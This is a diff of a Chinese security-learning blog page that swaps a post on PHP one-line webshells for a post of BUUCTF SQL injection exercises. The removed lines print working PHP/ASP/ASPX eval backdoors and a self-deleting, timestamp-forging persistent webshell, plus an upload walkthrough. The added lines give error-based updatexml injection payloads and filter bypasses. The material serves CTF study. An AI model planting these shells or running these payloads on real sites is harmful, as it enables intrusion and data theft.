@@ -10,7 +10,7 @@
   
   <title>
     
-      php一句话木马 | Hexo
+      SQL日志 | Hexo
     
   </title>
   <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
@@ -193,8 +193,8 @@
 </header>
 
     <div id="article-banner">
-  <h2>php一句话木马</h2>
-  <p class="post-date">2021-11-08</p>
+  <h2>SQL日志</h2>
+  <p class="post-date">2021-11-11</p>
   <div class="arrow-down">
     <a href="javascript:;"></a>
   </div>
@@ -202,53 +202,41 @@
 <main class="app-body flex-box">
   <!-- Article START -->
   <article class="post-article">
-    <section class="markdown-content"><p>这一篇博客的主要内容是php一句话木马的了解和使用，这里只是先学习了最基础的内容。</p>
+    <section class="markdown-content"><p>周四培训了sql注入和无列名注入，以下是练习题，来自<a target="_blank" rel="noopener" href="https://buuoj.cn/">buu平台</a>。</p>
 <span id="more"></span>
-<h4 id="基本原理">基本原理</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>利用<strong>文件上传漏洞</strong>，往目标网站中上传一句话木马，然后你就可以在本地通过蚁剑即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘pass’]表示从页面中获得pass这个参数值。</p>
-<p>入侵条件主要有三：</p>
-<ol>
-<li>木马上传成功；</li>
-<li>明确木马路径；</li>
-<li>上传的木马能够正常运行。</li>
-</ol>
-<p>常见的一句话木马：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="木马利用">木马利用</h4>
-<p>在实际运用之前，我们首先需要了解eval函数与一句话木马之间密不可分的关系，对于eval函数，我们并不陌生：eval() 函数用来执行一个字符串表达式，并返回表达式的值；并且该字符串必须是合法的php代码，且以分号结尾。像如下这样的一般用法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$string = &quot;beautiful&quot;;</span><br><span class="line">$time = &quot;winter&quot;;</span><br><span class="line">$str = &#x27;This is a $string $time morning!&#x27;;</span><br><span class="line">echo $str. &quot;&lt;br /&gt;&quot;;</span><br><span class="line">eval(&quot;\$str = \&quot;$str\&quot;;&quot;);</span><br><span class="line">echo $str;</span><br><span class="line">?&gt; </span><br><span class="line">输出</span><br><span class="line">This is a $string $time morning!</span><br><span class="line">This is a beautiful winter morning!</span><br></pre></td></tr></table></figure>
-<p>传马在url上编辑，参数值则是为http的POST方式，意味着我们有时侯也需要在post下进行编辑。当然，木马能否上传成功很大程度上是看网站的保护机制，这就要求我们在上传的时候要根据实际情况作不同程度的绕过，我们可以好好的参考一下一些大佬写的文章。</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/85334893"> Web安全-文件上传漏洞与WAF绕过</a></p>
-<p>同时也要学会合理的利用工具，例如中国菜刀和蚁剑等。</p>
-<h4 id="不死马">不死马</h4>
-<p>在AWD模式下，木马的利用是很重要的，不过一般的一句话木马很容易被识破，所以就衍生出了各种加强版，不死马正是其中比较典型的一种。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ignore_user_abort(true);</span><br><span class="line">	set_time_limit(0);</span><br><span class="line">	unlink(__FILE__);</span><br><span class="line">	$file = &#x27;/var/www/dvwa/.ski12.php&#x27;;</span><br><span class="line">	$code = &#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@system($_POST[a]);&#125;?&gt;&#x27;;</span><br><span class="line">	while (1) &#123;</span><br><span class="line">		file_put_contents($file, $code);</span><br><span class="line">		system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .ski12.php&#x27;);</span><br><span class="line">		usleep(5000);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<ol>
-<li><code>ignore_user_abort(true);</code><br>
-函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</li>
-<li><code>set_time_limit()</code><br>
-函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</li>
-<li><code>unlink(__FILE__)</code><br>
-删除文件本身，以起到隐蔽自身的作用。</li>
-<li><code>while</code><br>
-循环内每隔usleep(5000)即写新的后门文件</li>
-<li><code>system()</code><br>
-执行的命令用于修改文件的创建或修改时间，可以绕过“find –name ‘*.php’ –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。</li>
-</ol>
-<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_filesystem_file_put_contents.asp"><strong>file_put_contents()函数</strong></a></p>
-<p>file_put_contents() 函数把一个字符串写入文件中，与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</p>
-<hr>
-<p>以上是不死马的基本形式，这也是从百度摘入的，保留下来对以后实战有帮助，同时也可以做出一些改进。当然，木马也有很多其他的类型，我们也是借鉴下面这篇博客。</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q851579181q/article/details/84930071">AWD模式下的各类PHP木马</a></p>
-<h4 id="题目（二手交易）">题目（二手交易）</h4>
-<p>这是我在bugku上做的一道和php木马一句话息息相关的题目，难度不大，但是很典型，那就简单的记录一下。</p>
-<p>首先登陆进去就是一个二手交易平台的简单网页，由于没有做出提示，所以我们往往一开始不知道要干什么，其实这时候可以尝试去看可以输入的地方，例如登陆、注册的页面，本题也是一样的。我们初步怀疑是不是可以用sqli注入，多次尝试后发现方向应该是错了。那我们再来考虑传马，对于传马，在less7我们是有简单接触过的，注册成功后会发现可以上传头像，这也正是我们利用图片传马。</p>
-<p>我们随便选择一张png上传抓包，可以看到image的数据是一段base64加密的乱码，而我们传马的位置也正是在这里，同样的，我们的一句话木马也要经过base64加密，这正是上面提到的绕过，还有就是要将image后的<strong>jpeg改为php</strong>，这样我们上传的文件照样是php后缀。</p>
-<p><img src="/2021/11/08/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/php.png" alt></p>
-<p>在重发器修改后发送就可以获取到我们上传的路径，这就是木马上传的条件之一，最后就是连接蚁剑了</p>
-<p>。首先，我们先添加数据，输入url（将上面得到的路径去掉\号并与去掉/User的原本路径合并起来）和密码，测试成功就可以在文件中找到flag，同时这也意味着该网站的数据已经被我们拿下了。</p>
-<p><img src="/2021/11/08/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/la.png" alt></p>
+<h4 id="LoveSQL">LoveSQL</h4>
+<p>首先是留的课后作业，极客大挑战LoveSQL，这个题目就和我们在sqli学习的模板题，而且并没有多大的改动，打开环境后，我们先任意输入账号密码，然后用burpsuite抓包。发现是GET方式，我们选择在username注入，注入步骤一步一步来，值得注意的是<code>#</code>被过滤了，可以选择用<code>%23</code>替代。由于我做的时候没有截下过程，这里就不在回去重做了，我们可以做一下其他的一些题目。</p>
+<p><img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/1.png" alt></p>
+<h4 id="BabySQL">BabySQL</h4>
+<p>题型还是一样的，但当我们<code>order by</code>查列时回显告诉我们存在sql注入，但是order by 却不见了，很明显是被过滤了，这时候我们可选择关键字重复（尝试了大小写绕过发现行不通），以union为例，我们替换成<code>uunionnion</code>，这样中间的被过滤掉剩下的刚好组成union，这里过滤只执行一次，所以剩下的就被保留了。</p>
+<p><img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/88.png" alt></p>
+<p>那么我们成功找到注入点，剩下就不言而喻了。</p>
+<p><img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/7.png" alt></p>
+<p>还是相对容易的，只不过他这里过滤的关键字挺多的，还是要多注意。</p>
+<h4 id="buyflag">buyflag</h4>
+<p>老规矩先看源码后抓包，发现cookie中uers=0，这就意味着uers的内容不会显示出来，把他改为1，可以抓包改，也可以在储存中直接修改。</p>
+<p><img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/6.png" alt></p>
+<p>修改完后页面会发生改变，这时候肯定了我们可以输入passward，结合源码：<img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/5.png" alt></p>
+<p>存在两个post方式下的变量，password和money，对于password，要求我们既是数字类型包含404，又不能是纯数字，所以我们可以采用404a等方式；对于money，要求是100000000，但当我们老实输入后又说长度过长，这时候我们可以采用科学计数法转换为<code>1e9</code>或者<code>money[]=1</code>，这样就可以拿到flag了。</p>
+<p><img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/3.png" alt></p>
+<h4 id="EasySQL">EasySQL</h4>
+<p>人如其名，确实是很easy，一个万能语句就出来了。（原本抱着蛮试一下的态度，没想到真解出来了）</p>
+<h4 id="HardSQL">HardSQL</h4>
+<p>可以看出，这关的难度会比之前大，那怎么体现他的难度呢，无非就是过滤掉更多的字符和关键字，我们可以尝试抓包看看都有哪些被过滤了。<img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/45.png" alt></p>
+<p>不出所料啊，过滤的字符和关键字多的一批，而且仔细观察，发现被过滤的关键字大多数是联合注入的关键字，这里可以选择试试报错注入，同时也要注意使用的函数有没有被过滤。</p>
+<p><img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/889.png" alt></p>
+<p>果然，报错注入是可行的（因为updatexml在password并没有被过滤），我们也拿到名为geek的数据库，应为substr被过滤了，后续我们就避免使用至于空格，还是用<code>)</code>替代，可能会有点乱，不过问题不大。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查表：username=a&#x27;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))%23</span><br><span class="line">查列：username=a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))%23</span><br></pre></td></tr></table></figure>
+<p>接下来就是查询账号密码拿flag了，这也正是该最秀的地方了，因为当我们输入后发现flag只回显左边的一部分，偏偏少了右边的部分，因此我们还需要在构造一次。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查字段：</span><br><span class="line">username=a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(&#x27;~&#x27;,username,password))from(H4rDsq1)),0x7e),1))%23 // 左</span><br><span class="line">username=a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))%23 // 右</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/0.png" alt></p>
+<p><img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/01.png" alt></p>
+<p>将左右去掉重复部分后拼接起来就可以得到flag。再者，注意到<code>right()</code>内的数据修改后会发生变化。所以我们要好好的介绍一下：</p>
+<p><strong>Right(string, length)</strong></p>
+<p>字符串表达式，从最右边的字符返回length长度。</p>
+<p>而这里因为显示的长度有限，且回显是从右向左的，这就是为什么我们改变length，却只能看到一部分，而当length的值超过flag的长度时，就只回显前面一部分的，也就是说，其实这不简单的是左右拼接，而是可选的回显部分，根本就是他对回显长度进行了限制。left()同理，但这里却不能用，因为left是从左边开始，在长度的限制下我们就无法看到偏右的值了。</p>
+<h4 id="FinalSQL">FinalSQL</h4>
+<p>这一关做了很久，但还是不太行，先搁着吧。</p>
 </section>
     <!-- Tags START -->
     
@@ -258,20 +246,13 @@
   <div class="nav-container">
     <!-- reverse left and right to put prev and next in a more logic postition -->
     
-      <a class="nav-left" href="/2021/11/04/sqli-labs-Less33-38/">
+      <a class="nav-left" href="/2021/11/08/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">
         <span class="nav-arrow">← </span>
         
-          sqli-labs-Less33-38
+          php一句话木马
         
       </a>
     
-    
-      <a class="nav-right" href="/2021/11/11/SQL%E6%97%A5%E5%BF%97/">
-        
-          SQL日志
-        
-        <span class="nav-arrow"> →</span>
-      </a>
     
   </div>
 
@@ -323,7 +304,7 @@
   <div class="toc-main">
     <strong class="toc-title">Catalog</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-nav-text">基本原理</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%9C%A8%E9%A9%AC%E5%88%A9%E7%94%A8"><span class="toc-nav-text">木马利用</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-nav-text">不死马</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%88%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%EF%BC%89"><span class="toc-nav-text">题目（二手交易）</span></a></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#LoveSQL"><span class="toc-nav-text">LoveSQL</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#BabySQL"><span class="toc-nav-text">BabySQL</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#buyflag"><span class="toc-nav-text">buyflag</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#EasySQL"><span class="toc-nav-text">EasySQL</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#HardSQL"><span class="toc-nav-text">HardSQL</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#FinalSQL"><span class="toc-nav-text">FinalSQL</span></a></li></ol>
     
   </div>
 </aside>
@@ -333,7 +314,7 @@
 
 <script>
   (function () {
-    var url = 'http://example.com/2021/11/08/php一句话木马/';
+    var url = 'http://example.com/2021/11/11/SQL日志/';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
